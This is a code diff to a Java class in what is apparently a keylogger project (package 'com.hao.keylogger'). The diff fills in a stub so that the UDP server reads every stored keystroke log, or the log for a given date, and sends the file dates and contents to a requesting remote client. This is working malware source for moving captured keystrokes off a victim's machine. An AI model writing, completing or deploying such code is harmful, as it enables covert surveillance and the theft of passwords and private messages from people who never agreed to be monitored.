@@ -1,19 +1,17 @@
 package com.hao.keylogger.controllers.server;
 
 import java.io.File;
+import java.io.FileFilter;
 import java.io.IOException;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetAddress;
 import java.net.SocketException;
 import java.net.UnknownHostException;
+import java.nio.file.Paths;
 import java.text.SimpleDateFormat;
 import java.util.Date;
-import java.util.Iterator;
 import java.util.StringTokenizer;
-
-import org.apache.commons.io.FileUtils;
-
 import com.hao.keylogger.models.Resource;
 
 public class UDPServerHelper {
@@ -120,31 +118,49 @@ public class UDPServerHelper {
 		}
 
 		private void getAllLogsAndSend(InetAddress address, int port) {
-			Iterator<File> logFiles = FileUtils.iterateFiles(new File(Resource.LOGS_DIRECTORY),
-					null, false);
-			while (logFiles.hasNext()) {
-				System.out.println(((File) logFiles.next()).getParent());
-				//TODO send each file to client
+			File logFolder = new File(Resource.LOGS_DIRECTORY);
+			File[] files = logFolder.listFiles();
+
+			String numOfLogs = files.length + "";
+			sendMessage(address, port, numOfLogs);
+
+			for (File f : logFolder.listFiles()) {
+				readFileAndSend(address, port, f.getPath());
 			}
 		}
 
 		private void getLogAndSend(InetAddress address, int port, Date date) {
+			// Tells the client that 1 file is comming
+			String numOfLogs = "1";
+			sendMessage(address, port, numOfLogs);
+			
+			// generate log file name
 			String dateStr = new SimpleDateFormat("d-M-yyyy").format(date);
 			String logFilePath = Resource.LOGS_DIRECTORY + File.separator + dateStr + Resource.LOG_FILE_EXTENSION;
-			FileManager fm = new FileManager(logFilePath);
 
-			String logContent;
+			readFileAndSend(address, port, logFilePath);
+		}
+
+		private void readFileAndSend(InetAddress address, int port, String logFilePath) {
+			FileManager fm = new FileManager(logFilePath);
+			StringTokenizer strTokenizer = new StringTokenizer(fm.getFileName(), ".");
+			String dateOfLogStr = strTokenizer.nextToken();
+			
 			try {
-				logContent = fm.readAll();
-				DatagramPacket outPacket = new DatagramPacket(logContent.getBytes(), logContent.length(), address,
-						port);
-				try {
-					socket.send(outPacket);
-				} catch (IOException e) {
-					controller.appendToMonitory(PROCESS_TAG + "Can not send packet");
-				}
+				String logContent = fm.readAll();
+				sendMessage(address, port, dateOfLogStr);
+				sendMessage(address, port, logContent);
 			} catch (IOException e1) {
 				controller.appendToMonitory(PROCESS_TAG + "File not found");
+			}
+		}
+
+		private void sendMessage(InetAddress address, int port, String msg) {
+			DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), address, port);
+			try {
+				socket.send(outPacket);
+			} catch (IOException e) {
+				controller.appendToMonitory(PROCESS_TAG + "Can not send packet");
 			}
 		}
 	}
